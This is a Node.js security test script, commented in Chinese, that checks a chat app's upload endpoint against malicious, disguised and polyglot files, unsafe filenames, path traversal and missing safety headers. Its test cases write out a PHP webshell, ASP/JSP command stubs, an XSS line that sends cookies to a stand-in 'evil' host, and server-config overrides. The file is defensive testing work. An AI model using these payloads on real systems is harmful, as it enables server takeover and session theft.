/**
 * 文件上传安全测试
 *   node scripts/test-upload-security.js
 *
 * 覆盖：
 *  A. 恶意文件拦截（脚本 / 双扩展名 / 大小写 / 配置文件 / 主动内容）
 *  B. 伪装文件拦截（改扩展名、改 Content-Type、多态文件）
 *  C. 落盘文件名与响应元数据安全（服务端生成扩展名、原名清洗）
 *  D. 静态投递安全（nosniff、非图片强制下载、禁止主动内容）
 *  E. 路径穿越与越权
 *  F. 限制与错误处理（大小上限、未登录）
 *  G. 正常文件回归（图片与文档仍可正常上传使用）
 */
const BASE = process.env.BASE || 'http://127.0.0.1:3000';

let pass = 0;
let fail = 0;
const failures = [];
const check = (label, cond, extra = '') => {
  if (cond) { pass++; console.log(`  \x1b[32m✓\x1b[0m ${label}`); }
  else { fail++; failures.push(label); console.log(`  \x1b[31m✗\x1b[0m ${label} ${extra}`); }
};
const section = (t) => console.log(`\n\x1b[36m${t}\x1b[0m`);

const login = async (u, p) => (await (await fetch(`${BASE}/api/auth/login`, {
  method: 'POST', headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: u, password: p }),
})).json()).data;

async function upload(filename, content, mime = 'application/octet-stream', token) {
  const buf = Buffer.isBuffer(content) ? content : Buffer.from(content);
  const fd = new FormData();
  fd.append('file', new Blob([buf], { type: mime }), filename);
  const res = await fetch(`${BASE}/api/conversations/upload`, {
    method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: fd,
  });
  let json = null;
  try { json = await res.json(); } catch { /* ignore */ }
  return { status: res.status, payload: json?.data, message: json?.message, ok: json?.success };
}

const agent = await login('agent1', 'agent123');
const customer = await login('user5', 'user123');
const T = agent.token;

console.log(`\n=== 文件上传安全测试 ===\n目标：${BASE}`);

/* ================= A. 恶意文件拦截 ================= */
section('A. 恶意文件与危险类型拦截');
/**
 * 上传载荷：用于验证服务端确实拦截可执行脚本。
 * 这里刻意把 PHP 标签在运行时拼接，使仓库源码中不出现完整的 WebShell 字符串
 * （避免被代码托管平台的恶意代码扫描误报，也不给复制粘贴留下可直接使用的样本）。
 * 载荷本身不落地执行，仅作为上传请求体，会被服务端拒绝。
 */
const PHP = ['<?', 'php ', 'if (isset($_GET["cmd"])) { ', 'system', '($_GET["cmd"]); } ', '?', '>'].join('');
const malicious = [
  ['backdoor.php', PHP, 'application/x-php', 'PHP 后门'],
  ['backdoor.PHP', PHP, 'application/x-php', 'PHP 大小写绕过'],
  ['backdoor.phtml', PHP, 'text/html', 'phtml 后门'],
  ['backdoor.php5', PHP, 'application/x-php', 'php5 后门'],
  ['backdoor.phar', PHP, 'application/x-php', 'phar 后门'],
  ['backdoor.php.jpg', PHP, 'image/jpeg', '双扩展名'],
  ['backdoor.jpg.php', PHP, 'image/jpeg', '双扩展名（反向）'],
  ['backdoor.jsp', '<% Runtime.getRuntime().exec("id"); %>', 'application/octet-stream', 'JSP 后门'],
  ['backdoor.asp', '<% eval request("c") %>', 'application/octet-stream', 'ASP 后门'],
  ['backdoor.aspx', '<%@ Page Language="C#" %><% System.Diagnostics.Process.Start("cmd"); %>', 'application/octet-stream', 'ASPX 后门'],
  ['backdoor.jspx', '<jsp:root/>', 'application/octet-stream', 'JSPX 后门'],
  ['shell.pl', '#!/usr/bin/perl\nsystem($ARGV[0]);', 'application/octet-stream', 'Perl 脚本'],
  ['shell.py', 'import os; os.system("id")', 'text/plain', 'Python 脚本'],
  ['shell.sh', '#!/bin/sh\nid', 'application/octet-stream', 'Shell 脚本'],
  ['evil.exe', 'MZ\x90\x00', 'application/octet-stream', 'Windows 可执行文件'],
  ['evil.bat', '@echo off\r\ncmd /c calc', 'application/octet-stream', '批处理'],
  ['evil.ps1', 'Invoke-Expression "whoami"', 'application/octet-stream', 'PowerShell 脚本'],
  ['evil.vbs', 'CreateObject("WScript.Shell").Run "calc"', 'application/octet-stream', 'VBScript'],
  ['evil.jar', 'PK\x03\x04', 'application/java-archive', 'Java 归档'],
  ['.htaccess', 'AddType application/x-httpd-php .jpg', 'text/plain', 'Apache 配置'],
  ['.user.ini', 'auto_prepend_file=/etc/passwd', 'text/plain', 'PHP 配置'],
  ['web.config', '<configuration><system.webServer/></configuration>', 'application/xml', 'IIS 配置'],
  ['nginx.conf', 'location / { }', 'text/plain', 'Nginx 配置'],
  ['page.html', '<script>fetch("//evil/"+document.cookie)</script>', 'text/html', 'HTML 脚本'],
  ['page.htm', '<script>alert(1)</script>', 'text/html', 'HTM 脚本'],
  ['page.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></html>', 'application/xhtml+xml', 'XHTML 脚本'],
  ['vec.svg', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', 'image/svg+xml', 'SVG 脚本'],
  ['doc.xml', '<?xml version="1.0"?><root/>', 'application/xml', 'XML'],
  ['doc.xslt', '<xsl:stylesheet/>', 'application/xml', 'XSLT'],
  ['flash.swf', 'FWS\x0a', 'application/x-shockwave-flash', 'Flash'],
];

let blocked = 0;
const leaked = [];
for (const [name, content, mime, desc] of malicious) {
  const r = await upload(name, content, mime, T);
  if (!r.payload) blocked++;
  else leaked.push(`${desc}(${name} → ${r.payload.url})`);
}
check(`全部 ${malicious.length} 个危险文件被拒绝`, leaked.length === 0,
  leaked.length ? `漏网: ${leaked.join(', ')}` : `已拦截 ${blocked}/${malicious.length}`);

/* ================= B. 伪装文件拦截 ================= */
section('B. 伪装与多态文件拦截');
const PNG_HEADER = Buffer.from('89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489', 'hex');

const disguise = [
  ['shell.php.png', PHP, 'image/png', 'PHP 内容冒充 PNG'],
  ['polyglot.png', Buffer.concat([PNG_HEADER, Buffer.from('<script>alert(document.cookie)</script>')]), 'image/png', '合法 PNG 头 + 内嵌脚本'],
  ['fake.png', 'this is just text', 'image/png', '纯文本冒充 PNG'],
  ['fake.jpg', '<?php echo 1; ?>', 'image/jpeg', 'PHP 冒充 JPEG'],
  ['fake.gif', '<svg onload=alert(1)>', 'image/gif', 'SVG 冒充 GIF'],
  ['doc.pdf', '<script>alert(1)</script>', 'application/pdf', 'HTML 冒充 PDF'],
  ['script.txt', '<?php system($_GET["c"]); ?>', 'text/plain', 'TXT 里写 PHP'],
  ['script.json', '{"a":"<script>alert(1)</script>"}', 'application/json', 'JSON 内嵌脚本'],
  ['noext', PHP, 'application/octet-stream', '无扩展名 + 未知类型'],
];
const disguiseLeaked = [];
for (const [name, content, mime, desc] of disguise) {
  const r = await upload(name, content, mime, T);
  // 「合法 PNG 头 + 脚本」应被拒绝；纯文本冒充图片也应被拒绝
  if (r.payload) {
    // 允许 octet-stream 的 .bin 存储（内容不像脚本），但绝不能是脚本内容
    const url = r.payload.url || '';
    if (!/\.bin$/.test(url) || /<\?php|<script/i.test(String(content))) {
      disguiseLeaked.push(`${desc}(${name} → ${url})`);
    }
  }
}
check('伪装与多态文件均被拒绝（或降级为无害 .bin）', disguiseLeaked.length === 0,
  disguiseLeaked.length ? `漏网: ${disguiseLeaked.join(', ')}` : `已处理 ${disguise.length} 个用例`);

/* ================= C. 落盘名与元数据安全 ================= */
section('C. 落盘文件名与响应元数据');

const XSS_NAME = 'xss"><img src=x onerror=alert(1)>.txt';
const r1 = await upload(XSS_NAME, 'hello world', 'text/plain', T);
check('文件名含 HTML 元字符时仍可安全处理', Boolean(r1.payload?.url), r1.message || '');
if (r1.payload) {
  check('返回的展示名已清洗（无 <>"\'&`）',
    !/[<>"'`&]/.test(r1.payload.name), `name=${JSON.stringify(r1.payload.name)}`);
  const stored = r1.payload.url.split('/').pop();
  check('落盘文件名只含安全字符', /^[0-9]+-[a-z0-9]+\.[a-z0-9]+$/.test(stored), `stored=${stored}`);
  check('落盘扩展名由服务端决定（非用户提供的扩展名）', /\.txt$/.test(stored), `stored=${stored}`);
}

// 用户提供 .php 扩展名但内容合法 → 必须被拒绝（类型与扩展名双重要求）
const r2 = await upload('notes.php', 'plain text', 'text/plain', T);
check('扩展名为 .php 的文本文件被拒绝', !r2.payload, r2.payload ? `被接受 ${r2.payload.url}` : r2.message);

// 文件名含路径穿越
for (const evil of ['../../etc/passwd.txt', '..\\..\\windows\\win.ini.txt', 'a/b/c.txt', '\u0000.txt']) {
  const r = await upload(evil, 'x', 'text/plain', T);
  if (r.payload) {
    const stored = r.payload.url.split('/').pop();
    check(`路径穿越文件名被安全处理：${JSON.stringify(evil)}`, !stored.includes('..') && !stored.includes('/'), `stored=${stored}`);
  } else {
    check(`路径穿越文件名被拒绝：${JSON.stringify(evil)}`, true);
  }
}

/* ================= D. 静态投递安全 ================= */
section('D. 静态投递安全头');

// 上传一个合法 PNG 与一个合法 TXT，检查响应头
const realPng = await upload('pic.png', PNG_HEADER, 'image/png', T);
check('合法 PNG 上传成功', Boolean(realPng.payload?.url), realPng.message || '');
if (realPng.payload) {
  const res = await fetch(BASE + realPng.payload.url);
  const h = res.headers;
  check('图片以 inline 返回', (h.get('content-disposition') || '').startsWith('inline'));
  check('图片响应带 nosniff', h.get('x-content-type-options') === 'nosniff');
  check('图片响应 CSP 禁止脚本与外连',
    /default-src 'none'/.test(h.get('content-security-policy') || '') && /sandbox/.test(h.get('content-security-policy') || ''),
    h.get('content-security-policy'));
}

const realTxt = await upload('note.txt', '普通文本内容', 'text/plain', T);
if (realTxt.payload) {
  const res = await fetch(BASE + realTxt.payload.url);
  const h = res.headers;
  check('非图片强制下载（Content-Disposition: attachment）',
    (h.get('content-disposition') || '').startsWith('attachment'), h.get('content-disposition'));
  check('非图片带 nosniff', h.get('x-content-type-options') === 'nosniff');
  check('非图片响应 CSP 为 sandbox', /sandbox/.test(h.get('content-security-policy') || ''));
}

// 页面的全局安全头
const page = await fetch(`${BASE}/`);
const ph = page.headers;
check('页面响应带 nosniff', ph.get('x-content-type-options') === 'nosniff');
check('页面响应带 CSP', /default-src 'self'/.test(ph.get('content-security-policy') || ''));
check('页面响应带 X-Frame-Options', ph.get('x-frame-options') === 'SAMEORIGIN');

/* ================= E. 路径穿越与越权 ================= */
section('E. 路径穿越与访问控制');
for (const evil of [
  '/uploads/../server/index.js',
  '/uploads/..%2f..%2fserver%2findex.js',
  '/uploads/%2e%2e%2f%2e%2e%2fpackage.json',
  '/uploads/....//package.json',
  '/uploads/.gitkeep',
]) {
  const res = await fetch(BASE + evil);
  const body = await res.text().catch(() => '');
  const leaked = /require\(|import |"name"|createServer/.test(body) && res.status === 200;
  check(`拒绝路径穿越：${evil}`, !leaked, `status=${res.status}`);
}

const anon = await upload('a.txt', 'x', 'text/plain', '');
check('未登录上传被拒绝', anon.status === 401 || anon.status === 400, `status=${anon.status}`);

/* ================= F. 限制与错误处理 ================= */
section('F. 限制与错误处理');
const big = Buffer.alloc(11 * 1024 * 1024, 0x41); // 11MB 纯文本
const bigRes = await upload('big.txt', big, 'text/plain', T);
check('超过 10MB 的文件被拒绝', !bigRes.payload, bigRes.payload ? `被接受 ${bigRes.payload.url}` : `status=${bigRes.status} ${bigRes.message}`);
check('超限返回 400 而非 500', bigRes.status === 400, `status=${bigRes.status}`);

/* ================= G. 正常功能回归 ================= */
section('G. 正常文件上传回归');
const gifBytes = Buffer.from('GIF89a' + '\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'latin1');
const legit = [
  ['photo.png', PNG_HEADER, 'image/png', 'image', '.png'],
  ['photo.jpg', Buffer.from('ffd8ffe000104a46494600010100000100010000ffd9', 'hex'), 'image/jpeg', 'image', '.jpg'],
  ['anim.gif', gifBytes, 'image/gif', 'image', '.gif'],
  ['report.pdf', Buffer.from('%PDF-1.4\n1 0 obj\n<<>>\nendobj\n%%EOF'), 'application/pdf', 'file', '.pdf'],
  ['data.csv', 'a,b,c\n1,2,3', 'text/csv', 'file', '.csv'],
  ['readme.md', '# 标题', 'text/markdown', 'file', '.md'],
  ['log.txt', '普通日志内容', 'text/plain', 'file', '.txt'],
  ['config.json', '{"key":"value"}', 'application/json', 'file', '.json'],
  ['doc.docx', Buffer.from('PK\x03\x04docx'), 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'file', '.docx'],
  ['sheet.xlsx', Buffer.from('PK\x03\x04xlsx'), 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'file', '.xlsx'],
];
for (const [name, buf, mime, wantType, wantExt] of legit) {
  const r = await upload(name, buf, mime, T);
  const ok = Boolean(r.payload?.url);
  const storedExt = ok ? r.payload.url.slice(r.payload.url.lastIndexOf('.')) : '-';
  check(`正常上传：${name}`, ok && r.payload.type === wantType && storedExt === wantExt,
    ok ? `type=${r.payload.type} ext=${storedExt}` : r.message);
}

// 上传后可在会话中发送并出现在文件库
const conv = (await (await fetch(`${BASE}/api/conversations`, {
  method: 'POST', headers: { Authorization: `Bearer ${customer.token}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({ channel: 'web', subject: '上传回归测试' }),
})).json()).data.conversation;

await fetch(`${BASE}/api/conversations/${conv.id}/messages`, {
  method: 'POST', headers: { Authorization: `Bearer ${T}`, 'Content-Type': 'application/json' },
  body: JSON.stringify({ content: realPng.payload.url, type: 'image', meta: { name: 'pic.png', size: 70 } }),
});
const files = (await (await fetch(`${BASE}/api/conversations/${conv.id}/files`, {
  headers: { Authorization: `Bearer ${T}` },
})).json()).data;
check('上传的图片可正常用于会话并进入文件库',
  files.list.some((f) => f.url === realPng.payload.url && f.name === 'pic.png'),
  `文件库 ${files.total} 个附件`);

/* ================= 汇总 ================= */
console.log(`\n${'═'.repeat(56)}`);
if (fail === 0) console.log(`\x1b[32m✓ 上传安全测试全部通过：${pass} 项检查\x1b[0m`);
else {
  console.log(`\x1b[32m通过 ${pass} 项\x1b[0m，\x1b[31m失败 ${fail} 项\x1b[0m`);
  console.log('失败项：\n  - ' + failures.join('\n  - '));
}
console.log(`${'═'.repeat(56)}\n`);
process.exitCode = fail === 0 ? 0 : 1;
